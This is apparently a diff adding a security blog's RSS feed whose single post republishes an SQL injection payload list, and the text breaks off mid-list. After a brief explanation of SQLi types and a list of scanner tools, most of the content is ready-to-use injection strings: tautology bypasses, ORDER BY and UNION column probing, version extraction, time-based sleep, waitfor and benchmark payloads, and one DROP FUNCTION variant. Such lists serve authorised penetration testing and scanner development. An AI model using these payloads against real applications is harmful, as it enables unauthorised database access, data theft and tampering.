@@ -1,0 +1,3243 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Or0kit • Posts by &#34;sql注入&#34; tag</title>
+        <link>https://Or0kit.github.io</link>
+        <description>临渊羡鱼，不如退而结网</description>
+        <language>zh-CN</language>
+        <pubDate>Wed, 30 Dec 2020 17:38:30 +0800</pubDate>
+        <lastBuildDate>Wed, 30 Dec 2020 17:38:30 +0800</lastBuildDate>
+        <category>Drozer</category>
+        <category>Algolia</category>
+        <category>同义词替换</category>
+        <category>xpath</category>
+        <category>win32api</category>
+        <category>WOW64</category>
+        <category>windows消息机制</category>
+        <category>虚拟内存</category>
+        <category>jsDelivr</category>
+        <category>First blog</category>
+        <category>markdown 学习</category>
+        <category>Android</category>
+        <category>替换密钥</category>
+        <category>数论基础</category>
+        <category>ADB</category>
+        <category>雷电模拟器</category>
+        <category>Hadoop</category>
+        <category>IDA</category>
+        <category>Windows逆向</category>
+        <category>SSH隧道</category>
+        <category>url</category>
+        <category>http</category>
+        <category>Nginx</category>
+        <category>Linux</category>
+        <category>CentOS7配置vsftp</category>
+        <category>Psad</category>
+        <category>fwsnort</category>
+        <category>应急响应</category>
+        <category>x86汇编指令</category>
+        <category>逆向</category>
+        <category>IDA学习</category>
+        <category>恶意代码分析实战入门</category>
+        <category>静态分析基础</category>
+        <category>动态分析技术基础</category>
+        <category>加壳</category>
+        <category>脱壳</category>
+        <category>C++壳</category>
+        <category>ESP寻址</category>
+        <category>定位Win32窗口回调函数</category>
+        <category>HOOK攻防</category>
+        <category>瞬时HOOK过检测</category>
+        <category>INLINE-HOOK</category>
+        <category>IAT HOOK</category>
+        <category>INLINE HOOK</category>
+        <category>进程监控</category>
+        <category>模块隐藏</category>
+        <category>进程通信</category>
+        <category>tlhelp32.h</category>
+        <category>进程遍历</category>
+        <category>模块遍历</category>
+        <category>TEB</category>
+        <category>PEB</category>
+        <category>R3层断链</category>
+        <category>外挂原理</category>
+        <category>DLL注入之进程间通信</category>
+        <category>Win临界区</category>
+        <category>Win互斥体</category>
+        <category>内存映射文件</category>
+        <category>内存映射共享</category>
+        <category>写拷贝</category>
+        <category>Win事件</category>
+        <category>线程同步</category>
+        <category>Win子窗口控件</category>
+        <category>win32文件函数</category>
+        <category>代码注入</category>
+        <category>窗口程序</category>
+        <category>消息机制</category>
+        <category>消息类型</category>
+        <category>私有内存</category>
+        <category>共享内存</category>
+        <category>设备对象</category>
+        <category>DC设备上下文</category>
+        <category>图形对象</category>
+        <category>创建线程</category>
+        <category>线程控制</category>
+        <category>线程相关API</category>
+        <category>线程上下文</category>
+        <category>CONTEXT结构体</category>
+        <category>物理内存</category>
+        <category>Windows进程</category>
+        <category>句柄表</category>
+        <category>远程线程函数</category>
+        <category>远程线程</category>
+        <category>DLL注入</category>
+        <category>DLL注入相关函数</category>
+        <category>WinMain函数</category>
+        <category>调用约定</category>
+        <category>我的GetProcAddress</category>
+        <category>资源文件</category>
+        <category>消息断点</category>
+        <category>通用控件</category>
+        <category>WM_NOTIFY消息类型</category>
+        <category>MFC</category>
+        <category>PE查看器</category>
+        <category>PE课后作业</category>
+        <category>RVA与FOA</category>
+        <category>PE结构</category>
+        <category>DOS头属性说明</category>
+        <category>标准PE头属性说明</category>
+        <category>扩展PE头属性说明</category>
+        <category>节表属性说明</category>
+        <category>空白区添加代码</category>
+        <category>合并节</category>
+        <category>导入表</category>
+        <category>注入</category>
+        <category>导入表注入</category>
+        <category>导出表</category>
+        <category>新增节</category>
+        <category>移动NT头</category>
+        <category>扩大节</category>
+        <category>移动导出表</category>
+        <category>移动重定位表</category>
+        <category>重定位表</category>
+        <category>静态链接库</category>
+        <category>动态链接库</category>
+        <category>句柄</category>
+        <category>button</category>
+        <category>单选框</category>
+        <category>复选框件</category>
+        <category>Edit</category>
+        <category>Combo Box</category>
+        <category>Tab</category>
+        <category>ListCtrl</category>
+        <category>MFC的本质</category>
+        <category>MFC的层次结构图</category>
+        <category>手动创建一个MFC程序</category>
+        <category>MFC的初始化过程</category>
+        <category>MFC运行时类型识别</category>
+        <category>关键字static</category>
+        <category>关键字const</category>
+        <category>MFC动态创建</category>
+        <category>MFC消息映射</category>
+        <category>结构体AFX_MSGMAP_ENTRY</category>
+        <category>结构体AFX_MSGM</category>
+        <category>MFC的三大类消息</category>
+        <category>数据传输</category>
+        <category>ini文件的读写</category>
+        <category>python</category>
+        <category>SSH</category>
+        <category>python文件读取</category>
+        <category>数据分析</category>
+        <category>socket</category>
+        <category>数据库编程</category>
+        <category>python内置属性</category>
+        <category>multiprocessing</category>
+        <category>threading</category>
+        <category>scrapy</category>
+        <category>测试</category>
+        <category>BHP</category>
+        <category>Python的import功能</category>
+        <category>木马</category>
+        <category>STL</category>
+        <category>Vector容器</category>
+        <category>Deque容器</category>
+        <category>List容器</category>
+        <category>Set容器</category>
+        <category>Multiset容器</category>
+        <category>Map容器</category>
+        <category>Multimap容器</category>
+        <category>Stack容器</category>
+        <category>Queue容器</category>
+        <category>STL算法</category>
+        <category>STL迭代器</category>
+        <category>CobaltStrike</category>
+        <category>RedTeam</category>
+        <category>Apeache</category>
+        <category>Nmap</category>
+        <category>php</category>
+        <category>guestbook</category>
+        <category>SQLmap</category>
+        <category>apache</category>
+        <category>log</category>
+        <category>mysql主键</category>
+        <category>CSRF</category>
+        <category>SSRF</category>
+        <category>业务逻辑漏洞</category>
+        <category>xss</category>
+        <category>webshell流量特征</category>
+        <category>虚拟网卡</category>
+        <category>0环与3环的通信（常规方法）</category>
+        <category>内核空间</category>
+        <category>内核模块</category>
+        <category>遍历内核模块</category>
+        <category>定位未导出函数PspTiminateProcess</category>
+        <category>内核编程基础</category>
+        <category>ANSI_STRING</category>
+        <category>UNICODE_STRING</category>
+        <category>内核内存</category>
+        <category>上下文环境</category>
+        <category>中断请求级别</category>
+        <category>链表</category>
+        <category>自旋锁</category>
+        <category>注册表</category>
+        <category>地址空间</category>
+        <category>文件操作</category>
+        <category>线程与事件</category>
+        <category>内核重载</category>
+        <category>驱动调试</category>
+        <category>配置VS2019+WDK10</category>
+        <category>第一个驱动程序</category>
+        <category>调试驱动程序</category>
+        <category>OpenSCManager</category>
+        <category>CreateService</category>
+        <category>APC的本质</category>
+        <category>APC的备用队列</category>
+        <category>消息队列</category>
+        <category>PsConvertToGuiThread</category>
+        <category>win32k.sys</category>
+        <category>GUI线程</category>
+        <category>窗口程序的创建</category>
+        <category>消息循环</category>
+        <category>线性地址的管理</category>
+        <category>VAD树</category>
+        <category>_MMVAD</category>
+        <category>_MMVAD_FLAGS</category>
+        <category>VirtualAlloc</category>
+        <category>MEM_COMMIT与MEM_RESERVE</category>
+        <category>malloc</category>
+        <category>堆内存</category>
+        <category>栈内存</category>
+        <category>全局区内存</category>
+        <category>共享物理页</category>
+        <category>共享文件</category>
+        <category>LoadLibrary的本质</category>
+        <category>MmAddPhysicalMemoryEx</category>
+        <category>缺页异常</category>
+        <category>临界区</category>
+        <category>KPCR结构体</category>
+        <category>等待链表</category>
+        <category>调度链表</category>
+        <category>模拟线程切换</category>
+        <category>模拟挂起与恢复函数</category>
+        <category>进程的创建</category>
+        <category>获取当前进程</category>
+        <category>ETHREAD</category>
+        <category>KTHREAD</category>
+        <category>EPROCESS</category>
+        <category>KPROCESS</category>
+        <category>2-9-9-12分页</category>
+        <category>PAE</category>
+        <category>PDPTE</category>
+        <category>PDE</category>
+        <category>PTE</category>
+        <category>XD标志位</category>
+        <category>逆向分析MmIsAddressValid函数(2-9-9-12)</category>
+        <category>PWT</category>
+        <category>PDT</category>
+        <category>TLB</category>
+        <category>CPU缓存</category>
+        <category>INVLPG指令</category>
+        <category>全局页</category>
+        <category>ShadowWalker</category>
+        <category>中断</category>
+        <category>异常</category>
+        <category>CLI指令</category>
+        <category>STI指令</category>
+        <category>INT2</category>
+        <category>INT8</category>
+        <category>中断门描述符</category>
+        <category>IDT</category>
+        <category>提权</category>
+        <category>TSS</category>
+        <category>跨段跳转流程</category>
+        <category>JMP FAR指令</category>
+        <category>任务门</category>
+        <category>LDT段描述符</category>
+        <category>LDT</category>
+        <category>CR0</category>
+        <category>CR2</category>
+        <category>CR4</category>
+        <category>CRL</category>
+        <category>DPL</category>
+        <category>RPL</category>
+        <category>段寄存器结构</category>
+        <category>段描述符</category>
+        <category>段选择子</category>
+        <category>GDT表</category>
+        <category>调用门</category>
+        <category>调用门描述符</category>
+        <category>逆向分析MmIsAddressValid函数</category>
+        <category>error C2143</category>
+        <category>error C2275</category>
+        <category>CALL与CALL FAR</category>
+        <category>陷阱门描述符</category>
+        <category>页目录表基址</category>
+        <category>页表的基址</category>
+        <category>0地址执行ShellCode</category>
+        <category>10-10-12分页</category>
+        <category>PDE_PTE</category>
+        <category>物理页</category>
+        <category>SSDT HOOK</category>
+        <category>OpenProcess</category>
+        <category>系统服务表</category>
+        <category>SSDT</category>
+        <category>SSDT HOOK隐藏</category>
+        <category>API进出内核</category>
+        <category>系统调用阶段总结</category>
+        <category>网络安全法</category>
+        <category>ASCII</category>
+        <category>GBK</category>
+        <category>ANSI</category>
+        <category>Unicode</category>
+        <category>UTF-8</category>
+        <category>URL 编码/解码</category>
+        <category>十进制</category>
+        <category>二进制</category>
+        <category>十六进制</category>
+        <category>内存</category>
+        <category>编写ShellCode实现IAT HOOK</category>
+        <category>ShellCode原则</category>
+        <category>傀儡进程加密壳</category>
+        <category>ZwUnmapViewOfSection函数</category>
+        <category>加载图标</category>
+        <category>提取图标</category>
+        <category>资源表</category>
+        <category>MFC命令传递</category>
+        <category>远控界面编写</category>
+        <category>HTML</category>
+        <category>文件包含</category>
+        <category>sql注入</category>
+        <category>经典定长指令</category>
+        <category>经典变长指令</category>
+        <category>指令前缀</category>
+        <category>进程句柄表</category>
+        <category>全局句柄表</category>
+        <category>KAPC</category>
+        <category>QueueUserAPC</category>
+        <category>NtQueueApcThread</category>
+        <category>KeInitializeApc</category>
+        <category>KeInsertQueueApc</category>
+        <category>KiInsertQueueApc</category>
+        <category>消息队列与线程</category>
+        <category>Windows线程切换</category>
+        <category>KiSwapContext</category>
+        <category>SwapContext</category>
+        <category>时钟中断</category>
+        <category>时间片管理</category>
+        <category>线程切换与TSS</category>
+        <category>线程切换与FS</category>
+        <category>线程切换与线程优先级</category>
+        <category>快速调用</category>
+        <category>中断调用</category>
+        <category>分析ReadProcessMemory</category>
+        <category>KiFastSystemCall</category>
+        <category>KiIntSystemCall</category>
+        <category>重写3环</category>
+        <category>文件上传</category>
+        <category>隐藏驱动</category>
+        <category>IopLoadDriver</category>
+        <category>延迟过程调用</category>
+        <category>进程挂靠</category>
+        <category>跨进程读写内存</category>
+        <category>APC</category>
+        <category>逆向分析NtReadVirtualMemory</category>
+        <category>逆向分析NtWriteVIrtualMemory</category>
+        <category>AD-Attack-Defense</category>
+        <category>payload</category>
+        <category>sysenter指令</category>
+        <category>KiFastCallEntry函数</category>
+        <category>KiSystemService函数</category>
+        <category>Trap_Frame</category>
+        <category>web安全</category>
+        <category>Pentest</category>
+        <item>
+            <guid isPermalink="true">https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/</guid>
+            <title>SQL-injection-payload-list【转】</title>
+            <link>https://or0kit.github.io/PenetrationTest/Web-Security/SQL-injection-payload-list/</link>
+            <category>sql注入</category>
+            <category>payload</category>
+            <pubDate>Wed, 30 Dec 2020 17:38:30 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;sql-injection-payload-list&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection-payload-list&#34;&gt;#&lt;/a&gt; SQL Injection Payload List&lt;/h1&gt;
+&lt;p&gt;源地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvc3FsLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=&#34;&gt;https://github.com/payloadbox/sql-injection-payload-list&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;sql-injection&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection&#34;&gt;#&lt;/a&gt; SQL Injection&lt;/h2&gt;
+&lt;p&gt;In this section, we&#39;ll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.&lt;/p&gt;
+&lt;h2 id=&#34;what-is-sql-injection-sqli&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#what-is-sql-injection-sqli&#34;&gt;#&lt;/a&gt; What is SQL injection (SQLi)?&lt;/h2&gt;
+&lt;p&gt;SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application&#39;s content or behavior.&lt;/p&gt;
+&lt;p&gt;In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;SQL Injection Type&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;In-band SQLi (Classic SQLi)&lt;/td&gt;
+&lt;td&gt;In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Error-based SQLi&lt;/td&gt;
+&lt;td&gt;Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Union-based SQLi&lt;/td&gt;
+&lt;td&gt;Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Inferential SQLi (Blind SQLi)&lt;/td&gt;
+&lt;td&gt;Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Boolean-based (content-based) Blind SQLi&lt;/td&gt;
+&lt;td&gt;Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Time-based Blind SQLi&lt;/td&gt;
+&lt;td&gt;Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. epending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Out-of-band SQLi&lt;/td&gt;
+&lt;td&gt;Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Voice Based Sql Injection&lt;/td&gt;
+&lt;td&gt;It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;sql-injection-vulnerability-scanner-tools&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection-vulnerability-scanner-tools&#34;&gt;#&lt;/a&gt; SQL Injection Vulnerability Scanner Tool&#39;s :&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw&#34;&gt;SQLMap&lt;/span&gt; – Automatic SQL Injection And Database Takeover Tool&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JvbjE5MC9qc3FsLWluamVjdGlvbg==&#34;&gt;jSQL Injection&lt;/span&gt; – Java Tool For Automatic SQL Database Injection&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL05lb2hhcHNpcy9iYnFzcWw=&#34;&gt;BBQSQL&lt;/span&gt; – A Blind SQL-Injection Exploitation Tool&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NvZGluZ28vTm9TUUxNYXA=&#34;&gt;NoSQLMap&lt;/span&gt; – Automated NoSQL Database Pwnage&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2l0cGxvaXQuY29tLzIwMTcvMDUvd2hpdGV3aWRvdy1zcWwtdnVsbmVyYWJpbGl0eS1zY2FubmVyLmh0bWw=&#34;&gt;Whitewidow&lt;/span&gt; – SQL Vulnerability Scanner&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N0YW1wYXJtL0RTU1M=&#34;&gt;DSSS&lt;/span&gt; – Damn Small SQLi Scanner&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2R0YWctZGV2LXNlYy9leHBsbw==&#34;&gt;explo&lt;/span&gt; – Human And Machine Readable Web Vulnerability Testing Format&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2F3bnVtYXIvYmxpbmQtc3FsLWJpdHNoaWZ0aW5n&#34;&gt;Blind-Sql-Bitshifting&lt;/span&gt; – Blind SQL-Injection via Bitshifting&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xldmlhdGhhbi1mcmFtZXdvcmsvbGV2aWF0aGFu&#34;&gt;Leviathan&lt;/span&gt; – Wide Range Mass Audit Toolkit&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0pvaG5Ucm9vbnkvQmxpc3F5&#34;&gt;Blisqy&lt;/span&gt; – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;generic-sql-injection-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generic-sql-injection-payloads&#34;&gt;#&lt;/a&gt; Generic SQL Injection Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&#39;
+&#39;&#39;
+`
+``
+,
+&amp;quot;
+&amp;quot;&amp;quot;
+/
+//
+\
+\\
+;
+&#39; or &amp;quot;
+-- or # 
+&#39; OR &#39;1
+&#39; OR 1 -- -
+&amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;
+&amp;quot; OR 1 = 1 -- -
+&#39; OR &#39;&#39; = &#39;
+&#39;=&#39;
+&#39;LIKE&#39;
+&#39;=0--+
+ OR 1=1
+&#39; OR &#39;x&#39;=&#39;x
+&#39; AND id IS NULL; --
+&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;2
+%00
+/*…*/ 
++		addition, concatenate (or space in url)
+||		(double pipe) concatenate
+%		wildcard attribute indicator
+
+@variable	local variable
+@@variable	global variable
+
+
+# Numeric
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+
+
+1&#39; ORDER BY 1--+
+1&#39; ORDER BY 2--+
+1&#39; ORDER BY 3--+
+
+1&#39; ORDER BY 1,2--+
+1&#39; ORDER BY 1,2,3--+
+
+1&#39; GROUP BY 1,2,--+
+1&#39; GROUP BY 1,2,3--+
+&#39; GROUP BY columnnames having 1=1 --
+
+
+-1&#39; UNION SELECT 1,2,3--+
+&#39; UNION SELECT sum(columnname ) from tablename --
+
+
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+
+1 AND (SELECT * FROM Users) = 1	
+
+&#39; AND MID(VERSION(),1,1) = &#39;5&#39;;
+
+&#39; and 1 in (select min(name) from sysobjects where xtype = &#39;U&#39; and name &amp;gt; &#39;.&#39;) --
+
+
+Finding the table name
+
+
+Time-Based:
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+&#39;;WAITFOR DELAY &#39;0:0:30&#39;--
+
+Comments:
+
+#	    Hash comment
+/*  	C-style comment
+-- -	SQL comment
+;%00	Nullbyte
+`	    Backtick
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;generic-error-based-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generic-error-based-payloads&#34;&gt;#&lt;/a&gt; Generic Error Based Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt; OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND (&#39;pytW&#39; LIKE &#39;pytW
+ OR 3409=3409 AND (&#39;pytW&#39; LIKE &#39;pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND &#39;%&#39;=&#39;
+ AND 1=0 AND &#39;%&#39;=&#39;
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND (&#39;1427=1427
+ AND 7506=9091 AND (&#39;5913=5913
+ AND 7300=7300 AND &#39;pKlZ&#39;=&#39;pKlZ
+ AND 7300=7300 AND &#39;pKlZ&#39;=&#39;pKlY
+ AND 7300=7300 AND (&#39;pKlZ&#39;=&#39;pKlZ
+ AND 7300=7300 AND (&#39;pKlZ&#39;=&#39;pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
+ ORDER BY 1-- 
+ ORDER BY 2-- 
+ ORDER BY 3-- 
+ ORDER BY 4-- 
+ ORDER BY 5-- 
+ ORDER BY 6-- 
+ ORDER BY 7-- 
+ ORDER BY 8-- 
+ ORDER BY 9-- 
+ ORDER BY 10-- 
+ ORDER BY 11-- 
+ ORDER BY 12-- 
+ ORDER BY 13-- 
+ ORDER BY 14-- 
+ ORDER BY 15-- 
+ ORDER BY 16-- 
+ ORDER BY 17-- 
+ ORDER BY 18-- 
+ ORDER BY 19-- 
+ ORDER BY 20-- 
+ ORDER BY 21-- 
+ ORDER BY 22-- 
+ ORDER BY 23-- 
+ ORDER BY 24-- 
+ ORDER BY 25-- 
+ ORDER BY 26-- 
+ ORDER BY 27-- 
+ ORDER BY 28-- 
+ ORDER BY 29-- 
+ ORDER BY 30-- 
+ ORDER BY 31337-- 
+ ORDER BY 1# 
+ ORDER BY 2# 
+ ORDER BY 3# 
+ ORDER BY 4# 
+ ORDER BY 5# 
+ ORDER BY 6# 
+ ORDER BY 7# 
+ ORDER BY 8# 
+ ORDER BY 9# 
+ ORDER BY 10# 
+ ORDER BY 11# 
+ ORDER BY 12# 
+ ORDER BY 13# 
+ ORDER BY 14# 
+ ORDER BY 15# 
+ ORDER BY 16# 
+ ORDER BY 17# 
+ ORDER BY 18# 
+ ORDER BY 19# 
+ ORDER BY 20# 
+ ORDER BY 21# 
+ ORDER BY 22# 
+ ORDER BY 23# 
+ ORDER BY 24# 
+ ORDER BY 25# 
+ ORDER BY 26# 
+ ORDER BY 27# 
+ ORDER BY 28# 
+ ORDER BY 29# 
+ ORDER BY 30#
+ ORDER BY 31337#
+ ORDER BY 1 
+ ORDER BY 2 
+ ORDER BY 3 
+ ORDER BY 4 
+ ORDER BY 5 
+ ORDER BY 6 
+ ORDER BY 7 
+ ORDER BY 8 
+ ORDER BY 9 
+ ORDER BY 10 
+ ORDER BY 11 
+ ORDER BY 12 
+ ORDER BY 13 
+ ORDER BY 14 
+ ORDER BY 15 
+ ORDER BY 16 
+ ORDER BY 17 
+ ORDER BY 18 
+ ORDER BY 19 
+ ORDER BY 20 
+ ORDER BY 21 
+ ORDER BY 22 
+ ORDER BY 23 
+ ORDER BY 24 
+ ORDER BY 25 
+ ORDER BY 26 
+ ORDER BY 27 
+ ORDER BY 28 
+ ORDER BY 29 
+ ORDER BY 30 
+ ORDER BY 31337 
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND &#39;Txws&#39;=&#39;
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND &#39;Txws&#39;=&#39;
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+%&#39; AND 8310=8310 AND &#39;%&#39;=&#39;
+%&#39; AND 8310=8311 AND &#39;%&#39;=&#39;
+ and (select substring(@@version,1,1))=&#39;X&#39;
+ and (select substring(@@version,1,1))=&#39;M&#39;
+ and (select substring(@@version,2,1))=&#39;i&#39;
+ and (select substring(@@version,2,1))=&#39;y&#39;
+ and (select substring(@@version,3,1))=&#39;c&#39;
+ and (select substring(@@version,3,1))=&#39;S&#39;
+ and (select substring(@@version,3,1))=&#39;X&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;generic-time-based-sql-injection-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generic-time-based-sql-injection-payloads&#34;&gt;#&lt;/a&gt; Generic Time Based SQL Injection Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;# from wapiti
+sleep(5)#
+1 or sleep(5)#
+&amp;quot; or sleep(5)#
+&#39; or sleep(5)#
+&amp;quot; or sleep(5)=&amp;quot;
+&#39; or sleep(5)=&#39;
+1) or sleep(5)#
+&amp;quot;) or sleep(5)=&amp;quot;
+&#39;) or sleep(5)=&#39;
+1)) or sleep(5)#
+&amp;quot;)) or sleep(5)=&amp;quot;
+&#39;)) or sleep(5)=&#39;
+;waitfor delay &#39;0:0:5&#39;--
+);waitfor delay &#39;0:0:5&#39;--
+&#39;;waitfor delay &#39;0:0:5&#39;--
+&amp;quot;;waitfor delay &#39;0:0:5&#39;--
+&#39;);waitfor delay &#39;0:0:5&#39;--
+&amp;quot;);waitfor delay &#39;0:0:5&#39;--
+));waitfor delay &#39;0:0:5&#39;--
+&#39;));waitfor delay &#39;0:0:5&#39;--
+&amp;quot;));waitfor delay &#39;0:0:5&#39;--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+&amp;quot; or benchmark(10000000,MD5(1))#
+&#39; or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+&amp;quot;) or benchmark(10000000,MD5(1))#
+&#39;) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+&amp;quot;)) or benchmark(10000000,MD5(1))#
+&#39;)) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+&amp;quot; or pg_sleep(5)--
+&#39; or pg_sleep(5)--
+1) or pg_sleep(5)--
+&amp;quot;) or pg_sleep(5)--
+&#39;) or pg_sleep(5)--
+1)) or pg_sleep(5)--
